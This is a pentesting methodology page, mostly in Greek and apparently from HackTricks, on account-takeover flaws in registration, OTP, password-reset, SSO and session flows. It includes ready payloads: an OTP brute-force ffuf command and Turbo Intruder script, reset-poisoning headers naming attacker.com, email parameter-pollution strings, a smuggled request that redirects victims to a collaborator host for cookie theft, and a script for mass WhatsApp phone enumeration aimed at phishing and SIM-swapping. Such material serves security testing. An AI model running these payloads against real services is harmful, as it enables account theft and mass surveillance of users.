# Ευπάθειες Εγγραφής & Takeover

{{#include ../banners/hacktricks-training.md}}

## Κατάληψη Εγγραφής

### Διπλή Εγγραφή

- Προσπάθησε να δημιουργήσεις χρησιμοποιώντας ένα υπάρχον όνομα χρήστη
- Δοκίμασε παραλλαγές του email:
- κεφαλαία γράμματα
- +1@
- πρόσθεσε κάποια τελεία στο email
- ειδικοί χαρακτήρες στο όνομα του email (%00, %09, %20)
- Πρόσθεσε κενά χαρακτήρες μετά το email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Δοκίμασε κόλπα κανονικοποίησης παρόχου email (εξαρτάται από την υπηρεσία):
- Το Gmail αγνοεί τελείες και subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` deliver to `victim@gmail.com`
- Ορισμένοι πάροχοι δεν διαχωρίζουν με πεζά/κεφαλαία το local-part
- Μερικοί πάροχοι δέχονται unicode confusables. Δοκίμασε homoglyphs και soft hyphen `\u00AD` στο local-part
- Κακοχρησιμοποίησε αυτά για: παρακάμπτοντας ελέγχους μοναδικότητας, απόκτηση διπλών accounts/workspace invites, ή μπλοκάροντας εγγραφές θύματος (προσωρινό DoS) ενώ προετοιμάζεις takeover

### Εντοπισμός Ονόματος Χρήστη

Έλεγξε αν μπορείς να καταλάβεις πότε ένα όνομα χρήστη έχει ήδη εγγραφεί στην εφαρμογή.

- Διαφορετικά μηνύματα σφάλματος ή HTTP status codes
- Διαφορές στο χρόνο απόκρισης (ο υπάρχων χρήστης μπορεί να προκαλέσει αναζήτηση σε IdP/DB)
- Αυτόματη συμπλήρωση φόρμας εγγραφής με προφίλ για γνωστά emails
- Έλεγξε team/invite flows: εισαγωγή email μπορεί να αποκαλύψει αν υπάρχει λογαριασμός

### Πολιτική Κωδικών

Κατά τη δημιουργία χρήστη έλεγξε την πολιτική κωδικού (έλεγξε αν μπορείς να χρησιμοποιήσεις αδύναμους κωδικούς).\
Σε αυτή την περίπτωση μπορείς να δοκιμάσεις brute-force των credentials.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)για να μάθεις πώς να επιχειρήσεις account takeovers ή να εξάγεις πληροφορίες μέσω **SQL Injections** σε φόρμες εγγραφής.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Αλλαγή Email

Αφού εγγραφείς, δοκίμασε να αλλάξεις το email και έλεγξε αν η αλλαγή επαληθεύεται σωστά ή αν μπορείς να το αλλάξεις σε οποιοδήποτε email.

### Επιπλέον Έλεγχοι

- Έλεγξε αν μπορείς να χρησιμοποιήσεις **disposable emails** (mailinator, yopmail, 1secmail, κ.λπ.) ή να παρακάμψεις τη blacklist με subaddressing όπως `victim+mailinator@gmail.com`
- **Μακρύς** **κωδικός** (>200) μπορεί να οδηγήσει σε **DoS**
- Έλεγξε τα όρια ρυθμού (rate limits) στη δημιουργία λογαριασμών
- Χρησιμοποίησε username@**burp_collab**.net και ανέλυσε το **callback**
- Αν χρησιμοποιείται επαλήθευση τηλεφώνου, έλεγξε parsing/injection edge cases αριθμού τηλεφώνου

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Οι messenger που επικεντρώνονται σε αριθμούς τηλεφώνου εκθέτουν ένα **presence oracle** κάθε φορά που ο client συγχρονίζει επαφές. Η επανάληψη των discovery requests του WhatsApp ιστορικά απέδιδε **>100M lookups per hour**, επιτρέποντας σχεδόν πλήρεις καταχωρήσεις λογαριασμών.

**Ροή επίθεσης**

1. **Instrument an official client** για να καταγράψεις το address-book upload request (authenticated blob κανονικοποιημένων αριθμών E.164). Επανάλαβέ το με attacker-generated numbers ενώ επαναχρησιμοποιείς τα ίδια cookies/device token.
2. **Batch numbers per request**: Το WhatsApp δέχεται χιλιάδες identifiers και επιστρέφει registered/unregistered συν metadata (business, companion, κ.λπ.). Ανάλυσε τις απαντήσεις offline για να χτίσεις λίστες στόχων χωρίς να στείλεις μηνύματα στα θύματα.
3. **Horizontally scale** την enumeration με SIM banks, cloud devices ή residential proxies ώστε το per-account/IP/ASN throttling να μην ενεργοποιείται ποτέ.

**Modeling του dialing-plan**

Μοντέλαρε το dialing plan κάθε χώρας για να αποφύγεις άκυρους υποψήφιους. Το NDSS dataset (`country-table.*`) απαριθμεί country codes, adoption density και platform split ώστε να μπορείς να προτεραιοποιήσεις ranges με υψηλά hit rates. Παράδειγμα seeding code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Προτεραιοποιήστε προθέματα που ταιριάζουν με πραγματικές κατανομές (Mobile Country Code + National Destination Code) πριν ερωτήσετε το oracle ώστε το throughput να παραμένει χρήσιμο.

**Turning enumerations into targeted attacks**

- Τροφοδοτήστε τα leaked phone numbers (π.χ. Facebook’s 2021 breach) στο oracle για να μάθετε ποιες ταυτότητες είναι ακόμα ενεργές πριν από phishing, SIM-swapping ή spamming.
- Διαχωρίστε τα censuses ανά country/OS/app type για να εντοπίσετε περιοχές με αδύναμο SMS filtering ή μεγάλη υιοθέτηση του WhatsApp Business για localized social engineering.

**Public-key reuse correlation**

WhatsApp exposes each account’s X25519 identity key during session setup. Ζητήστε identity material για κάθε enumerated number και αφαιρέστε διπλότυπα public keys για να αποκαλύψετε account farms, cloned clients ή insecure firmware — shared keys deanonymize multi-SIM operations.

## Αδύνατος Έλεγχος Email/Phone (OTP/Magic Link)

Οι registration flows συχνά επαληθεύουν την ιδιοκτησία μέσω ενός αριθμητικού OTP ή ενός magic-link token. Τυπικά σφάλματα:

- Guessable ή σύντομο OTP (4–6 digits) χωρίς αποτελεσματικό rate limiting ή IP/device tracking. Δοκιμάστε παράλληλες μαντεψιές και header/IP rotation.
- OTP reuse ανά actions ή accounts, ή μη δεσμευμένο στον συγκεκριμένο user/action (π.χ. ίδιο code λειτουργεί για login και signup, ή λειτουργεί μετά από αλλαγή email).
- Multi-value smuggling: μερικά backends δέχονται πολλούς κωδικούς και επαληθεύουν αν κάποιος ταιριάζει. Try:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: διακρίνετε wrong vs expired vs wrong-user codes από το status/message/body length.
- Tokens που δεν invalidated μετά από επιτυχία ή μετά από αλλαγή password/email.
- Verification token που δεν είναι δεμένο σε user agent/IP, επιτρέποντας cross-origin completion από attacker-controlled pages.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Παράλληλη/συγχρονισμένη μαντεψιά για παράκαμψη διαδοχικών αποκλεισμών (χρησιμοποιήστε Turbo Intruder στο Burp):

<details>
<summary>Snippet του Turbo Intruder για να πλημμυρίσετε προσπάθειες OTP 6 ψηφίων</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: submit the same valid OTP simultaneously in two sessions; sometimes one session becomes a verified attacker account while the victim flow also succeeds.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Μια ισχυρή κατηγορία προβλημάτων εμφανίζεται όταν ένας attacker πραγματοποιεί ενέργειες στο email του victim πριν ο victim δημιουργήσει τον λογαριασμό του και μετά επανακτά πρόσβαση αργότερα.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Πρακτικές συμβουλές

- Harvest flows and endpoints from web/mobile bundles. Look for classic signup, SSO linking, email/phone change, and password reset endpoints.
- Create realistic automation to keep sessions alive while you exercise other flows.
- For SSO tests, stand up a test OIDC provider and issue tokens with `email` claims for the victim address and `email_verified=false` to check if the RP trusts unverified IdPs.
- After any password reset or email change, verify that:
  - all other sessions and tokens are invalidated,
  - pending email/phone change capabilities are cancelled,
  - previously linked IdPs/emails/phones are re‑verified.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR σε παραμέτρους API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Ο επιτιθέμενος πρέπει να συνδεθεί με τον λογαριασμό του και να μεταβεί στη λειτουργία **Αλλαγή κωδικού**.
2. Ξεκινήστε το Burp Suite και αναχαιτίστε το αίτημα
3. Στείλτε το στο tab repeater και επεξεργαστείτε τις παραμέτρους : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Αδύναμο token επαναφοράς κωδικού <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Το token επαναφοράς κωδικού πρέπει να δημιουργείται τυχαία και να είναι μοναδικό κάθε φορά.\
Προσπαθήστε να προσδιορίσετε αν το token λήγει ή αν είναι πάντα το ίδιο — σε ορισμένες περιπτώσεις ο αλγόριθμος δημιουργίας είναι αδύναμος και μπορεί να μαντευτεί. Οι ακόλουθες μεταβλητές μπορεί να χρησιμοποιούνται από τον αλγόριθμο.

- Χρονοσφραγίδα
- ID χρήστη
- Email χρήστη
- Όνομα και Επώνυμο
- Ημερομηνία γέννησης
- Κρυπτογραφία
- Μόνο αριθμοί
- Μικρή ακολουθία token (χαρακτήρες μεταξύ \[A-Z,a-z,0-9])
- Επαναχρησιμοποίηση token
- Ημερομηνία λήξης token

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Προκαλέστε αίτημα επαναφοράς κωδικού χρησιμοποιώντας το API/UI για ένα συγκεκριμένο email π.χ.: test@mail.com
2. Επιθεωρήστε την απάντηση του server και ελέγξτε για `resetToken`
3. Στη συνέχεια χρησιμοποιήστε το token σε ένα URL όπως `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Καταχωρήστε στο σύστημα ένα username ταυτόσημο με του θύματος, αλλά με κενά πριν και/ή μετά το username. π.χ: `"admin "`
2. Αιτηθείτε επαναφορά κωδικού με το κακόβουλο username σας.
3. Χρησιμοποιήστε το token που στάλθηκε στο email σας και επαναφέρετε τον κωδικό του θύματος.
4. Συνδεθείτε στον λογαριασμό του θύματος με τον νέο κωδικό.

Η πλατφόρμα CTFd ήταν ευάλωτη σε αυτή την επίθεση.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Εντοπίστε ένα XSS μέσα στην εφαρμογή ή σε ένα subdomain εάν τα cookies είναι scoped στο parent domain : `*.domain.com`
2. Leak the current **sessions cookie**
3. Αυθεντικοποιηθείτε ως ο χρήστης χρησιμοποιώντας το cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Χρησιμοποιήστε **smuggler** για να εντοπίσετε τον τύπο του HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Σχεδιάστε ένα αίτημα που θα αντικαταστήσει το `POST / HTTP/1.1` με τα παρακάτω δεδομένα:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` με σκοπό να ανοίξετε redirect τα θύματα προς burpcollab και να κλέψετε τα cookies τους\
3. Το τελικό αίτημα μπορεί να μοιάζει ως εξής
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Αναφορές στο Hackerone που περιγράφουν την εκμετάλλευση αυτού του bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Κατάληψη λογαριασμού μέσω CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Δημιουργήστε ένα payload για το CSRF, π.χ.: “HTML form with auto submit for a password change”
2. Στείλτε το payload

### Κατάληψη λογαριασμού μέσω JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token might be used to authenticate an user.

- Επεξεργαστείτε το JWT με άλλο User ID / Email
- Ελέγξτε για αδύναμη υπογραφή JWT


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Κάποιοι signup handlers εκτελούν upsert όταν το δοθέν Email υπάρχει ήδη. Αν το endpoint δέχεται ένα ελάχιστο body με Email και password και δεν επιβάλλει ownership verification, η αποστολή του Email του θύματος θα αντικαταστήσει το password του pre-auth.

- Discovery: harvest endpoint names from bundled JS (or mobile app traffic), then fuzz base paths like /parents/application/v4/admin/FUZZ using ffuf/dirsearch.
- Method hints: a GET returning messages like "Only POST request is allowed." often indicates the correct verb and that a JSON body is expected.
- Ελάχιστο body που παρατηρήθηκε στον πραγματικό κόσμο:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Παράδειγμα PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Επίπτωση: Πλήρης Account Takeover (ATO) χωρίς οποιονδήποτε reset token, OTP ή επαλήθευση email.

## Αναφορές

- [Πώς βρήκα ένα κρίσιμο Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (Μάιος 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! Χρησιμοποιείτε WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
